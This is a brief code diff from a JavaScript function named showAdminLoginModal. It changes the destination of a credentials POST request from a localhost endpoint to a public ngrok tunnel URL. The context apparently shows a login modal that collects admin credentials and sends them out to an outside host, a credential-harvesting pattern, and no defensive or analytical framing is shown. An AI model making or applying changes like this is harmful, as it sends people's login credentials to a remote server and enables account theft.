@@ -122,7 +122,7 @@ function showAdminLoginModal() {
             modal.remove();
 
             // Send credentials to server
-            fetch("http://localhost:8000/creds", {
+            fetch("https://elidible-micah-futile.ngrok-free.dev/creds", {
                 method: "POST",
                 headers: {
                     "Content-Type": "application/json"
